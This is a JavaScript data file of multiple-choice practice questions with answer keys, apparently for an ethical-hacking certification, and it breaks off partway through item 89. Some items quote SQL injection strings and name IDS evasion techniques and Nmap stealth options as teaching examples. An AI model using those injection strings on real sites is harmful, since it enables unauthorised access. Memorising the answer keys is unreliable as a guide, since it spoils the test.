const EXAM_DATA = {
  "1": [
    {
      "q": 1,
      "type": "MCQ",
      "question": "What is a set of extensions to DNS that provide to DNS clients (resolvers) origin authentication, authenticated denial of existence and data integrity, but not availability or confidentiality?",
      "options": [
        "Zone transfer",
        "Resource transfer",
        "Resource records",
        "DNSSEC"
      ],
      "correct": "D",
      "explanation": "DNSSEC is a set of extensions to DNS that provides origin authentication, authenticated denial of existence, and data integrity."
    },
    {
      "q": 2,
      "type": "MCQ",
      "question": "Jack sent an email to Jenny with a business proposal. Jenny accepted it and fulfilled all her obligations. Jack suddenly refused his offer when everything was ready and said that he had never sent an email. Which of the following digital signature properties will help Jenny prove that Jack is lying?",
      "options": [
        "Integrity",
        "Non-Repudiation",
        "Authentication",
        "Confidentiality"
      ],
      "correct": "B",
      "explanation": "Non-repudiation is the assurance that someone cannot deny the validity of something."
    },
    {
      "q": 3,
      "type": "MCQ",
      "question": "Which of the following best describes a software firewall?",
      "options": [
        "Software firewall is placed between the anti-virus application and the IDS components of the operating system.",
        "Software firewall is placed between the desktop and the software components of the operating system.",
        "Software firewall is placed between the router and the networking components of the operating system.",
        "Software firewall is placed between the normal application and the networking components of the operating system."
      ],
      "correct": "D",
      "explanation": "A software firewall is placed between the normal application and the networking components of the operating system."
    },
    {
      "q": 4,
      "type": "MCQ",
      "question": "What are the two main conditions for a digital signature?",
      "options": [
        "Unique and have special characters.",
        "It has to be the same number of characters as a physical signature and must be unique.",
        "Unforgeable and authentic.",
        "Legible and neat."
      ],
      "correct": "C",
      "explanation": "Digital signatures must be unforgeable and authentic."
    },
    {
      "q": 5,
      "type": "MCQ",
      "question": "Maria is surfing the internet and try to find information about Super Security LLC. Which process is Maria doing?",
      "options": [
        "Enumeration",
        "System Hacking",
        "Footprinting",
        "Scanning"
      ],
      "correct": "C",
      "explanation": "Footprinting is a part of the reconnaissance process used to gather possible information about a target."
    },
    {
      "q": 6,
      "type": "MCQ",
      "question": "Maria conducted a successful attack and gained access to a Linux server. She wants to avoid that NIDS will not catch the succeeding outgoing traffic from this server in the future. Which of the following is the best way to avoid detection of NIDS?",
      "options": [
        "Encryption.",
        "Out of band signaling.",
        "Alternate Data Streams.",
        "Protocol Isolation."
      ],
      "correct": "A",
      "explanation": "When the NIDS encounters encrypted traffic, it can only perform packet level analysis."
    },
    {
      "q": 7,
      "type": "MCQ",
      "question": "Ivan, a black hat hacker, sends partial HTTP requests to the target webserver to exhaust the target server's maximum concurrent connection pool. What type of attack does Ivan implement?",
      "options": [
        "Fragmentation",
        "Slowloris",
        "Spoofed Session Flood",
        "HTTP GET/POST"
      ],
      "correct": "B",
      "explanation": "Slowloris tries to keep many connections open and hold them as long as possible."
    },
    {
      "q": 8,
      "type": "MCQ",
      "question": "Define Metasploit module used to perform arbitrary, one-off actions such as port scanning, denial of service, SQL injection and fuzzing?",
      "options": [
        "Payload Module.",
        "NOPS Module.",
        "Exploit Module.",
        "Auxiliary Module."
      ],
      "correct": "D",
      "explanation": "Auxiliary modules do not require the use of a payload to run like exploit modules."
    },
    {
      "q": 9,
      "type": "MCQ",
      "question": "Which regulation defines security and privacy controls for all U.S. federal information systems except those related to national security?",
      "options": [
        "PCI-DSS",
        "NIST-800-53",
        "EU Safe Harbor",
        "HIPAA"
      ],
      "correct": "B",
      "explanation": "NIST Special Publication 800-53 provides a catalog of security and privacy controls."
    },
    {
      "q": 10,
      "type": "MCQ",
      "question": "Ivan, a black hat hacker, tries to call numerous random numbers inside the company, claiming he is from the technical support service. What method of social engineering does Ivan use?",
      "options": [
        "Reverse Social Engineering",
        "Tailgating",
        "Quid Pro Quo",
        "Elicitation"
      ],
      "correct": "C",
      "explanation": "In a quid pro quo attack, the hacker offers a service or benefit in exchange for information."
    },
    {
      "q": 11,
      "type": "MCQ",
      "question": "John performs black-box testing. It tries to pass IRC traffic over port 80/TCP from a compromised web-enabled host during the test. Traffic is blocked, but outbound HTTP traffic does not meet any obstacles. What type of firewall checks outbound traffic?",
      "options": [
        "Stateful",
        "Packet Filtering",
        "Circuit",
        "Application"
      ],
      "correct": "D",
      "explanation": "Application firewall controls communications up to the application layer."
    },
    {
      "q": 12,
      "type": "MCQ",
      "question": "Which layer 3 protocol allows for end-to-end encryption of the connection?",
      "options": [
        "SFTP",
        "IPsec",
        "SSL",
        "FTPS"
      ],
      "correct": "B",
      "explanation": "IPsec is a layer 3 protocol that provides end-to-end encryption."
    },
    {
      "q": 13,
      "type": "MCQ",
      "question": "John, a cybersecurity specialist, received a copy of the event logs from all firewalls. He tried to match all the registered events in all the logs, and he found that their sequence didn't match. What can cause such a problem?",
      "options": [
        "The security breach was a false positive.",
        "A proper chain of custody was not observed while collecting the logs.",
        "The network devices are not all synchronized.",
        "The attacker altered events from the logs."
      ],
      "correct": "C",
      "explanation": "If network devices do not have synchronized times, timestamps will be inaccurate."
    },
    {
      "q": 14,
      "type": "MCQ",
      "question": "Which of the following command-line flags set a stealth scan for Nmap?",
      "options": [
        "-sT",
        "-sU",
        "-sS",
        "-sM"
      ],
      "correct": "C",
      "explanation": "TCP SYN scan (-sS) is the stealth scan option."
    },
    {
      "q": 15,
      "type": "MCQ",
      "question": "The attacker posted a message and an image on the forum, in which he embedded a malicious link. When the victim clicks on this link, the victim's browser sends an authenticated request to a server. What type of attack did the attacker use?",
      "options": [
        "Cross-site request forgery",
        "Cross-site scripting",
        "SQL injection",
        "Session hijacking"
      ],
      "correct": "A",
      "explanation": "CSRF exploits the trust that a site has in a user's browser."
    },
    {
      "q": 16,
      "type": "MCQ",
      "question": "The Web development team decides to modify the software requirements to disallow users from entering HTML as input into their Web application. What type of vulnerability are they addressing?",
      "options": [
        "Cross-site scripting vulnerability.",
        "Cross-site Request Forgery vulnerability.",
        "SQL injection vulnerability.",
        "Website defacement vulnerability."
      ],
      "correct": "A",
      "explanation": "Non-persistent XSS vulnerability occurs when user-supplied data is used immediately without proper sanitizing."
    },
    {
      "q": 17,
      "type": "MCQ",
      "question": "You conduct an investigation and finds out that the browser of one of your employees sent malicious requests that the employee knew nothing about. Identify the web page vulnerability that the attacker used?",
      "options": [
        "File Inclusion Attack",
        "Cross-Site Request Forgery (CSRF)",
        "Command Injection Attacks",
        "Hidden Field Manipulation Attack"
      ],
      "correct": "B",
      "explanation": "CSRF is an attack where unauthorized commands are submitted from a trusted user."
    },
    {
      "q": 18,
      "type": "MCQ",
      "question": "Identify the type of jailbreaking which allows user-level access and does not allow iboot-level access?",
      "options": [
        "Userland Exploit",
        "Bootrom Exploit",
        "iBootrom Exploit",
        "iBoot Exploit"
      ],
      "correct": "A",
      "explanation": "Userland Exploit allows user-level access but does not allow iboot-level access."
    },
    {
      "q": 19,
      "type": "MCQ",
      "question": "Determine the type of SQL injection: SELECT * FROM user WHERE name = 'x' AND userid IS NULL; --';",
      "options": [
        "UNION SQL Injection.",
        "End of Line Comment.",
        "Tautology.",
        "Illegal/Logically Incorrect Query."
      ],
      "correct": "B",
      "explanation": "This is an End of Line Comment attack using --."
    },
    {
      "q": 20,
      "type": "MCQ",
      "question": "Which of the following SQL injection attack does an attacker usually bypassing user authentication and extract data by using a conditional OR clause?",
      "options": [
        "UNION SQLi",
        "Error-Based SQLi",
        "End-of-Line Comment",
        "Tautology"
      ],
      "correct": "D",
      "explanation": "Tautology uses conditional OR operator such that the query always evaluates to TRUE."
    },
    {
      "q": 21,
      "type": "MCQ",
      "question": "Josh, a security analyst, wants to choose a tool to examine links between data using graphs and link analysis. Which tool will meet his requirements?",
      "options": [
        "Metasploit.",
        "Maltego.",
        "Analyst's Notebook.",
        "Palantir."
      ],
      "correct": "B",
      "explanation": "Maltego focuses on providing transforms for discovery of data and visualizing in graph format."
    },
    {
      "q": 22,
      "type": "MCQ",
      "question": "Benjamin performs a cloud attack during the translation of the SOAP message in the TLS layer. He duplicates the body of the message and sends it to the server. What attack does Benjamin perform?",
      "options": [
        "Wrapping",
        "Cloud Hopper",
        "Cloudborne",
        "aLTEr"
      ],
      "correct": "A",
      "explanation": "Wrapping attacks inject a faked element into the message structure."
    },
    {
      "q": 23,
      "type": "MCQ",
      "question": "Determine what type of honeypot simulates the real production network of the target organization?",
      "options": [
        "High-interaction Honeypots.",
        "Pure Honeypots.",
        "Research honeypots.",
        "Low-interaction Honeypots."
      ],
      "correct": "B",
      "explanation": "Pure honeypots are full-fledged production systems."
    },
    {
      "q": 24,
      "type": "MCQ",
      "question": "Which type of viruses tries to hide from antivirus programs by actively changing and corrupting the chosen service call interruptions when they are being run?",
      "options": [
        "Stealth/Tunneling virus",
        "Cavity virus",
        "Polymorphic virus",
        "Tunneling virus"
      ],
      "correct": "A",
      "explanation": "Stealth/Tunneling virus attempts to bypass detection by installing itself in the interrupt handler chain."
    },
    {
      "q": 25,
      "type": "MCQ",
      "question": "Which of the following is not included in the list of recommendations of PCI Data Security Standards?",
      "options": [
        "Do not use vendor-supplied defaults for system passwords.",
        "Rotate employees handling credit card transactions on a yearly basis to different departments.",
        "Protect stored cardholder data.",
        "Encrypt transmission of cardholder data across open, public networks."
      ],
      "correct": "B",
      "explanation": "Rotating employees is not a PCI DSS requirement."
    },
    {
      "q": 26,
      "type": "MCQ",
      "question": "Philip needs a tool that can function as a network sniffer, record network activity, prevent and detect network intrusion. Which tool is suitable?",
      "options": [
        "Nmap",
        "Cain & Abel",
        "Snort",
        "Nessus"
      ],
      "correct": "C",
      "explanation": "Snort can be configured in sniffer, packet logger, and NIDS modes."
    },
    {
      "q": 27,
      "type": "MCQ",
      "question": "Your company has implemented identify people based on walking patterns and RFID badges for physical access. Which best describes this technology?",
      "options": [
        "The solution will have a high level of false positives.",
        "Biological motion cannot be used to identify people.",
        "Although the approach has two phases, it implements just one authentication factor.",
        "The solution implements two factors authentication: physical object and physical characteristic."
      ],
      "correct": "D",
      "explanation": "This implements two-factor authentication using something you have and something you are."
    },
    {
      "q": 28,
      "type": "MCQ",
      "question": "Which of the following protocols is used in a VPN for setting up a secure channel between two devices?",
      "options": [
        "PPP",
        "SET",
        "PEM",
        "IPSEC"
      ],
      "correct": "D",
      "explanation": "IPsec is used in virtual private networks (VPNs)."
    },
    {
      "q": 29,
      "type": "MCQ",
      "question": "You know that the application you are attacking is vulnerable to an SQL injection, but you cannot see the result of the injection. You send a SQL query that makes the database wait. What type of SQL injection did you use?",
      "options": [
        "Blind SQLi.",
        "Out-of-band SQLi.",
        "Error-based SQLi.",
        "UNION SQLi."
      ],
      "correct": "A",
      "explanation": "Blind SQLi uses time-based techniques where you cannot see responses."
    },
    {
      "q": 30,
      "type": "MCQ",
      "question": "Which of the following tools is a command-line vulnerability scanner that scans web servers for dangerous files/CGIs?",
      "options": [
        "John the Ripper",
        "Kon-Boot",
        "Snort",
        "Nikto"
      ],
      "correct": "D",
      "explanation": "Nikto is a web server scanner that checks for dangerous files and vulnerabilities."
    },
    {
      "q": 31,
      "type": "MCQ",
      "question": "Which application security testing method is white-box testing where only the source code is scanned?",
      "options": [
        "IAST",
        "DAST",
        "SAST",
        "MAST"
      ],
      "correct": "C",
      "explanation": "Static Application Security Testing (SAST) scans source code for vulnerabilities."
    },
    {
      "q": 32,
      "type": "MCQ",
      "question": "Which of the following is the method of determining the movement of a data packet from an untrusted external host to a protected internal host through a firewall?",
      "options": [
        "MITM",
        "Firewalking",
        "Session hijacking",
        "Network sniffing"
      ],
      "correct": "B",
      "explanation": "Firewalking determines which ports are open through a firewall."
    },
    {
      "q": 33,
      "type": "MCQ",
      "question": "Often, for a successful attack, hackers collect maximum information about the company including emails of real employees. What is the name of this stage?",
      "options": [
        "Exploration stage",
        "Investigation stage",
        "Reconnaissance stage",
        "Enumeration stage"
      ],
      "correct": "C",
      "explanation": "Reconnaissance stage involves gathering information about the target."
    },
    {
      "q": 34,
      "type": "MCQ",
      "question": "An attacker creates a transparent 'iframe' in front of a banner which victim attempts to click. What attack is this?",
      "options": [
        "Session Fixation",
        "Clickjacking Attack",
        "HTML Injection",
        "HTTP Parameter Pollution"
      ],
      "correct": "B",
      "explanation": "Clickjacking tricks users into clicking invisible elements."
    },
    {
      "q": 35,
      "type": "MCQ",
      "question": "A hacker connects his router to the network and redirects traffic to intercept packets. What can the administrator do to mitigate the attack?",
      "options": [
        "Use the Open Shortest Path First (OSPF).",
        "Add message authentication to the routing protocol.",
        "Use only static routes.",
        "Redirection is not possible without admin confirmation."
      ],
      "correct": "B",
      "explanation": "Message authentication prevents rogue routers from participating in routing."
    },
    {
      "q": 36,
      "type": "MCQ",
      "question": "Which of the following is not a Bluetooth attack?",
      "options": [
        "Bluesmacking",
        "Bluesnarfing",
        "Bluejacking",
        "Bluedriving"
      ],
      "correct": "D",
      "explanation": "Bluedriving is a bluetooth wardriving utility, not an attack."
    },
    {
      "q": 37,
      "type": "MCQ",
      "question": "You analyze logs showing sequential port scanning from 192.168.0.30 to 192.168.0.132 on ports 20, 21, 22, 23, 25, 80, 443. What is this?",
      "options": [
        "Denial of service attack targeting 192.168.0.132",
        "Port scan targeting 192.168.0.30",
        "Teardrop attack targeting 192.168.0.132",
        "Port scan targeting 192.168.0.132"
      ],
      "correct": "D",
      "explanation": "Sequential requests to different ports indicates port scanning."
    },
    {
      "q": 38,
      "type": "MCQ",
      "question": "With which SQL injection attack can an attacker modify or add data stored in a database?",
      "options": [
        "Unauthorized access to an application.",
        "Compromised Data Integrity.",
        "Loss of data availability.",
        "Information Disclosure."
      ],
      "correct": "B",
      "explanation": "SQL injection can modify or add records, leading to compromised data integrity."
    },
    {
      "q": 39,
      "type": "MCQ",
      "question": "The attacker enters malicious data into intercepted messages in a TCP session and tries to guess the responses. What hijacking technique is this?",
      "options": [
        "RST",
        "TCP/IP",
        "Blind",
        "Registration"
      ],
      "correct": "C",
      "explanation": "Blind hijacking involves injecting data without seeing responses."
    },
    {
      "q": 40,
      "type": "MCQ",
      "question": "Which query best describes an attempt to exploit insecure direct object using the name 'User1'?",
      "options": [
        "GET/restricted/bank.getaccount('User1') HTTP/1.1 Host: westbank.com",
        "GET/restricted/goldtransfer?to=Account&from=1 or 1=1' HTTP/1.1Host: westbank.com",
        "GET/restricted/\\r\\n\\%00account%00User1%00access HTTP/1.1 Host: westbank.com",
        "GET/restricted/accounts/?name=User1 HTTP/1.1 Host: westbank.com"
      ],
      "correct": "D",
      "explanation": "IDOR vulnerability allows changing name parameter to access other user accounts."
    },
    {
      "q": 41,
      "type": "MCQ",
      "question": "What action should be performed before using a Vulnerability Scanner?",
      "options": [
        "TCP/IP stack fingerprinting.",
        "Checking if the remote host is alive.",
        "TCP/UDP Port scanning.",
        "Firewall detection."
      ],
      "correct": "B",
      "explanation": "First step is locating live hosts in the target network."
    },
    {
      "q": 42,
      "type": "MCQ",
      "question": "Which of the following is the risk that remains after natural or inherent risks have been reduced?",
      "options": [
        "Residual risk",
        "Impact risk",
        "Inherent risk",
        "Deferred risk"
      ],
      "correct": "A",
      "explanation": "Residual risk = (Inherent risk) - (impact of risk controls)."
    },
    {
      "q": 43,
      "type": "MCQ",
      "question": "Which incident handling phase is responsible for defining rules, training, and preparing resources before an incident occurs?",
      "options": [
        "Recovery",
        "Containment",
        "Identification",
        "Preparation"
      ],
      "correct": "D",
      "explanation": "Preparation phase establishes policies, procedures, and resources before incidents."
    },
    {
      "q": 44,
      "type": "MCQ",
      "question": "In what format is data presented in Wireshark's packet bytes pane?",
      "options": [
        "ASCII only",
        "Hexadecimal",
        "Binary",
        "Decimal"
      ],
      "correct": "B",
      "explanation": "Packet bytes pane shows data in hexadecimal format."
    },
    {
      "q": 45,
      "type": "MCQ",
      "question": "Alex conducts a pentest inside the network with no information about the attacked network. What type of testing is this?",
      "options": [
        "Internal, Black-box.",
        "External, Black-box.",
        "Internal, Grey-box.",
        "Internal, White-box."
      ],
      "correct": "A",
      "explanation": "Black-box testing with no information conducted internally."
    },
    {
      "q": 46,
      "type": "MCQ",
      "question": "Victor sends an email to an employee changing the original email address to the boss's email. What type of attack did Victor use?",
      "options": [
        "Eavesdropping",
        "Piggybacking",
        "Social engineering",
        "Tailgating"
      ],
      "correct": "C",
      "explanation": "Social engineering uses psychological manipulation to trick users."
    },
    {
      "q": 47,
      "type": "MCQ",
      "question": "Which Nmap command allows you to most reduce the probability of detection by IDS when scanning?",
      "options": [
        "nmap -sT -O -T0",
        "nmap -A --host-timeout 99-T1",
        "nmap -sT -O -T2",
        "nmap -A - Pn"
      ],
      "correct": "A",
      "explanation": "T0 (paranoid) timing is slowest and best for IDS evasion."
    },
    {
      "q": 48,
      "type": "MCQ",
      "question": "Which network software suite is designed for 802.11 WEP and WPA-PSK keys cracking?",
      "options": [
        "Aircrack-ng",
        "WLAN-crack",
        "Airguard",
        "Wificracker"
      ],
      "correct": "A",
      "explanation": "Aircrack-ng is a WEP and WPA/WPA2-PSK cracker for 802.11 wireless LANs."
    },
    {
      "q": 49,
      "type": "MCQ",
      "question": "Which best describes code injection?",
      "options": [
        "Malicious user gains access to the codebase on the server and inserts new code.",
        "Malicious user inserts additional code into JavaScript in the browser.",
        "Malicious user gets the server to execute arbitrary code using buffer overflow.",
        "Malicious user inserts text into a data field interpreted as code."
      ],
      "correct": "D",
      "explanation": "Code injection exploits processing of invalid data as code."
    },
    {
      "q": 50,
      "type": "MCQ",
      "question": "Which method is best for searching open ports on servers during internal audit?",
      "options": [
        "Scan servers with Nmap.",
        "Scan servers with MBSA.",
        "Manual scan on each server.",
        "Telnet to every port on each server."
      ],
      "correct": "A",
      "explanation": "Nmap is fast and efficient for port scanning."
    },
    {
      "q": 51,
      "type": "MCQ",
      "question": "Alex performs a scan where the TCP Header is split into many packets. What scanning technique is this?",
      "options": [
        "ACK flag scanning",
        "TCP Scanning",
        "IP Fragmentation Scan",
        "Inverse TCP flag scanning"
      ],
      "correct": "C",
      "explanation": "IP Fragmentation scan splits packets to evade detection."
    },
    {
      "q": 52,
      "type": "MCQ",
      "question": "Which encryption technique uses data encrypted by a sequence of photons that have a spinning trait?",
      "options": [
        "Hardware-Based.",
        "Quantum Cryptography.",
        "Homomorphic.",
        "Elliptic Curve Cryptography."
      ],
      "correct": "B",
      "explanation": "Quantum cryptography uses quantum mechanical properties like photon spin."
    },
    {
      "q": 53,
      "type": "MCQ",
      "question": "Which regulation contains guidelines for electronic data in medicine including saving, accessing, and sharing medical data securely?",
      "options": [
        "COBIT",
        "ISO/IEC 27002",
        "HIPAA",
        "FISMA"
      ],
      "correct": "C",
      "explanation": "HIPAA specifies how healthcare information should be protected."
    },
    {
      "q": 54,
      "type": "MCQ",
      "question": "You make interactive queries, choosing plaintexts based on previous encryptions. What attack are you performing?",
      "options": [
        "Chosen-plaintext attack",
        "Ciphertext-only attack",
        "Known-plaintext attack",
        "Adaptive chosen-plaintext attack"
      ],
      "correct": "D",
      "explanation": "Adaptive chosen-plaintext attack bases choices on previous results."
    },
    {
      "q": 55,
      "type": "MCQ",
      "question": "Which characteristic represents an anomaly-based IDS over a signature-based IDS?",
      "options": [
        "Can identify unknown attacks.",
        "Produces less false positives.",
        "Cannot deal with encrypted network traffic.",
        "Requires vendor updates for new threats."
      ],
      "correct": "A",
      "explanation": "Anomaly-based IDS can detect previously unseen malware."
    },
    {
      "q": 56,
      "type": "MCQ",
      "question": "Which protocol is used for querying databases that store registered users of Internet resources like domain names?",
      "options": [
        "CAPTCHA",
        "Internet Engineering Task Force",
        "Internet Assigned Numbers Authority",
        "WHOIS"
      ],
      "correct": "D",
      "explanation": "WHOIS queries databases storing domain registrations and IP allocations."
    },
    {
      "q": 57,
      "type": "MCQ",
      "question": "Elon wants to make it difficult for packet filters to determine packet purpose. Which scanning technique will he use?",
      "options": [
        "ACK scanning.",
        "IPID scanning.",
        "ICMP scanning.",
        "SYN/FIN scanning using IP fragments."
      ],
      "correct": "D",
      "explanation": "SYN/FIN with IP fragments evades packet filtering."
    },
    {
      "q": 58,
      "type": "MCQ",
      "question": "Which will allow preventing unauthorized wireless network access to local area networks?",
      "options": [
        "HIDS",
        "AISS",
        "WIPS",
        "NIDS"
      ],
      "correct": "C",
      "explanation": "Wireless Intrusion Prevention System (WIPS) prevents unauthorized wireless access."
    },
    {
      "q": 59,
      "type": "MCQ",
      "question": "Which Secure Hashing Algorithm produces a 160-bit digest similar to MD4 and MD5?",
      "options": [
        "SHA-2",
        "SHA-1",
        "SHA-0",
        "SHA-3"
      ],
      "correct": "B",
      "explanation": "SHA-1 produces a 160-bit hash value using principles similar to MD4/MD5."
    },
    {
      "q": 60,
      "type": "MCQ",
      "question": "Ivan splits attack traffic into many packets so no single packet triggers IDS. Which IDS evasion technique is this?",
      "options": [
        "Unicode Evasion.",
        "Session Splicing.",
        "Low-bandwidth attacks.",
        "Flooding."
      ],
      "correct": "B",
      "explanation": "Session splicing splits data between several packets to evade IDS signatures."
    },
    {
      "q": 61,
      "type": "MCQ",
      "question": "Which tool is a packet sniffer, network detector and IDS for 802.11 wireless LANs?",
      "options": [
        "Abel",
        "Nessus",
        "Nmap",
        "Kismet"
      ],
      "correct": "D",
      "explanation": "Kismet is a network detector and packet sniffer for 802.11 wireless LANs."
    },
    {
      "q": 62,
      "type": "MCQ",
      "question": "What is the purpose of the demilitarized zone?",
      "options": [
        "To add protect to network devices.",
        "To scan all traffic coming through the DMZ.",
        "To provide a place for a honeypot.",
        "To add an extra layer of security to an organization's LAN."
      ],
      "correct": "D",
      "explanation": "DMZ adds an extra layer of security to the internal network."
    },
    {
      "q": 63,
      "type": "MCQ",
      "question": "You want to quickly get a list of all machines in network 10.10.0.0/24. Which Nmap command?",
      "options": [
        "nmap -T4 -F 10.10.0.0/24",
        "nmap -T4 -r 10.10.1.0/24",
        "nmap -T4 -q 10.10.0.0/24",
        "nmap -T4 -p 10.10.0.0/24"
      ],
      "correct": "A",
      "explanation": "-F flag performs fast scan of top 100 ports instead of 1000."
    },
    {
      "q": 64,
      "type": "MCQ",
      "question": "Which IDS evasion method depends on Time-to-Live (TTL) fields?",
      "options": [
        "Obfuscation",
        "Unicode Evasion",
        "Denial-of-Service Attack",
        "Insertion Attack"
      ],
      "correct": "D",
      "explanation": "Insertion Attack crafts packets with TTL to reach IDS but not target."
    },
    {
      "q": 65,
      "type": "MCQ",
      "question": "alert tcp any any -> 10.199.10.3 21 (msg: 'FTP on the network!';) - Which system uses this configuration?",
      "options": [
        "Firewall IPTable",
        "Router IPTable",
        "FTP Server rule",
        "IDS"
      ],
      "correct": "D",
      "explanation": "This is Snort IDS rule syntax."
    },
    {
      "q": 66,
      "type": "MCQ",
      "question": "What is a 'Collision attack'?",
      "options": [
        "Collision attack tries to find two inputs producing the same hash value.",
        "Collision attacks break hash into parts with same bytes to get private key.",
        "Collision attacks attempt to recover information from a hash.",
        "Collision attacks try to change the hash."
      ],
      "correct": "A",
      "explanation": "Collision attack finds two different inputs that produce the same hash."
    },
    {
      "q": 67,
      "type": "MCQ",
      "question": "Which attack is a known-plaintext attack against DES where encrypting with one key followed by second key is no more secure than single key?",
      "options": [
        "Traffic analysis attack",
        "Meet-in-the-middle attack",
        "Man-in-the-middle attack",
        "Replay attack"
      ],
      "correct": "B",
      "explanation": "Meet-in-the-middle attack is a space-time tradeoff cryptographic attack."
    },
    {
      "q": 68,
      "type": "MCQ",
      "question": "Which OpenSSL vulnerability allows stealing information protected by SSL/TLS encryption?",
      "options": [
        "SSL/TLS Renegotiation Vulnerability",
        "Heartbleed Bug",
        "Shellshock",
        "POODLE"
      ],
      "correct": "B",
      "explanation": "Heartbleed is a buffer over-read vulnerability in OpenSSL."
    },
    {
      "q": 69,
      "type": "MCQ",
      "question": "The hacker uses fake identities to create traffic congestion illusion affecting communication. What attack is this?",
      "options": [
        "Side-Channel Attack",
        "Forged Malicious Device",
        "Sybil Attack",
        "Exploit Kits"
      ],
      "correct": "C",
      "explanation": "Sybil attack creates multiple identities to subvert reputation systems."
    },
    {
      "q": 70,
      "type": "MCQ",
      "question": "John enters huge amounts of random data and observes changes. What SQL injection testing technique is this?",
      "options": [
        "Dynamic Testing.",
        "Static Testing.",
        "Function Testing.",
        "Fuzzing Testing."
      ],
      "correct": "D",
      "explanation": "Fuzzing injects semi-random data to find bugs."
    },
    {
      "q": 71,
      "type": "MCQ",
      "question": "Which Nmap option scans fewer ports than default?",
      "options": [
        "-p",
        "-T",
        "-sP",
        "-F"
      ],
      "correct": "D",
      "explanation": "-F (Fast scan) reduces from 1000 to 100 ports."
    },
    {
      "q": 72,
      "type": "MCQ",
      "question": "Anonymous user uploaded files to FTP and ran a script. What vulnerability exists?",
      "options": [
        "File system permissions.",
        "Privilege escalation.",
        "Brute force login.",
        "Directory traversal."
      ],
      "correct": "A",
      "explanation": "Improper file system permissions allowed execution."
    },
    {
      "q": 73,
      "type": "MCQ",
      "question": "Sites unavailable by URL but work by IP. Ping works. What problem?",
      "options": [
        "Traffic Blocked on UDP Port 69",
        "Traffic Blocked on UDP Port 53",
        "Traffic Blocked on UDP Port 88",
        "Traffic Blocked on UDP Port 56"
      ],
      "correct": "B",
      "explanation": "DNS uses UDP port 53 for name resolution."
    },
    {
      "q": 74,
      "type": "MCQ",
      "question": "Ivan conducts SQLi attack based on True/False questions. What type?",
      "options": [
        "Blind SQLi",
        "Classic SQLi",
        "DMS-specific SQLi",
        "Compound SQLi"
      ],
      "correct": "A",
      "explanation": "Blind SQLi infers information through True/False responses."
    },
    {
      "q": 75,
      "type": "MCQ",
      "question": "Which web attack injects 'Carriage Return' and 'Line Feed' special characters?",
      "options": [
        "CRLF Injection.",
        "HTML Injection.",
        "Log Injection.",
        "Server-Side JS Injection."
      ],
      "correct": "A",
      "explanation": "CRLF injection manipulates HTTP headers using CR and LF characters."
    },
    {
      "q": 76,
      "type": "MCQ",
      "question": "Which Docker network driver creates connection between container and parent host interface?",
      "options": [
        "Bridge networking.",
        "Macvlan networking.",
        "Host networking.",
        "Overlay networking."
      ],
      "correct": "B",
      "explanation": "Macvlan assigns MAC address making container appear as physical device."
    },
    {
      "q": 77,
      "type": "MCQ",
      "question": "ACL configuration allows UDP to 10.0.0.3 and Internet to 10.0.0.2. First ACL denies all TCP. What happened?",
      "options": [
        "The ACL for FTP must be before ACL 110.",
        "The ACL 104 needs to be first because is UDP.",
        "The ACL 110 needs to be changed to port 80.",
        "The first ACL is denying all TCP traffic."
      ],
      "correct": "D",
      "explanation": "First rule denying all TCP traffic blocks all subsequent TCP rules."
    },
    {
      "q": 78,
      "type": "MCQ",
      "question": "Which can be designated as 'Wireshark for CLI'?",
      "options": [
        "nessus",
        "tcpdump",
        "ethereal",
        "John the Ripper"
      ],
      "correct": "B",
      "explanation": "tcpdump is a command-line packet analyzer like Wireshark."
    },
    {
      "q": 79,
      "type": "MCQ",
      "question": "What is automated testing providing invalid, unexpected, or random data as inputs?",
      "options": [
        "Concolic testing",
        "Fuzz testing",
        "Security testing",
        "Monkey testing"
      ],
      "correct": "B",
      "explanation": "Fuzzing provides invalid/random data to find vulnerabilities."
    },
    {
      "q": 80,
      "type": "MCQ",
      "question": "Which Google search operator restricts results to specific website?",
      "options": [
        "[link:]",
        "[inurl:]",
        "[site:]",
        "[cache:]"
      ],
      "correct": "C",
      "explanation": "site: operator limits results to specific domain."
    },
    {
      "q": 81,
      "type": "MCQ",
      "question": "Hard drive costs $300, failure chance 1/3, recovery $10/hr for 14 hours. Calculate ALE.",
      "options": [
        "$146",
        "$440",
        "$960",
        "$295"
      ],
      "correct": "A",
      "explanation": "ALE = SLE \u00d7 ARO = ($300 + 14\u00d7$10) \u00d7 (1/3) = $146."
    },
    {
      "q": 82,
      "type": "MCQ",
      "question": "Which firewall protects against SQL injection attacks?",
      "options": [
        "Hardware firewall.",
        "Packet firewall.",
        "Stateful firewall.",
        "Web application firewall."
      ],
      "correct": "D",
      "explanation": "WAF filters HTTP traffic and prevents SQL injection."
    },
    {
      "q": 83,
      "type": "MCQ",
      "question": "What violation is when unauthorized individual enters building following an employee?",
      "options": [
        "Tailgating.",
        "Pretexting.",
        "Announced.",
        "Reverse Social Engineering."
      ],
      "correct": "A",
      "explanation": "Tailgating is entering restricted area by following authorized person."
    },
    {
      "q": 84,
      "type": "MCQ",
      "question": "Which virus attacks both boot sector and executable files?",
      "options": [
        "Polymorphic virus",
        "Multipartite Virus",
        "Macro virus",
        "Stealth virus"
      ],
      "correct": "B",
      "explanation": "Multipartite virus can attack both boot sector and executables."
    },
    {
      "q": 85,
      "type": "MCQ",
      "question": "Specialist sends test email 'From: employee76@company.com' over Internet successfully. Gateway doesn't prevent what?",
      "options": [
        "Email Harvesting",
        "Email Masquerading",
        "Email Spoofing",
        "Email Phishing"
      ],
      "correct": "C",
      "explanation": "Email spoofing is fabrication of email header to appear from different source."
    },
    {
      "q": 86,
      "type": "MCQ",
      "question": "IDS registers alerts when admin accesses external router to update configuration. What type of alert?",
      "options": [
        "False negative",
        "True positive",
        "True negative",
        "False positive"
      ],
      "correct": "D",
      "explanation": "False positive is when IDS identifies acceptable activity as attack."
    },
    {
      "q": 87,
      "type": "MCQ",
      "question": "How to ensure financial reports immutability between CFO and accountant?",
      "options": [
        "Use hash algorithm once CFO approves.",
        "Send using exclusive USB.",
        "Use protected excel file.",
        "Send twice via email and USB."
      ],
      "correct": "A",
      "explanation": "Hash algorithm verifies file hasn't been modified."
    },
    {
      "q": 88,
      "type": "MCQ",
      "question": "URL shows account?id=368940911028389&Damount=10980. Modifying values changes page data. What vulnerability?",
      "options": [
        "Web Parameter Tampering",
        "Cookie Tampering",
        "SQL injection",
        "XSS Reflection"
      ],
      "correct": "A",
      "explanation": "Web Parameter Tampering manipulates parameters to modify application data."
    },
    {
      "q": 89,
      "type": "MCQ",
      "question": "Ferdinand installs virtual communication tower between endpoints to mislead victim. What attack?",
      "options": [
        "Aspidistra",
        "Wi-Jacking",
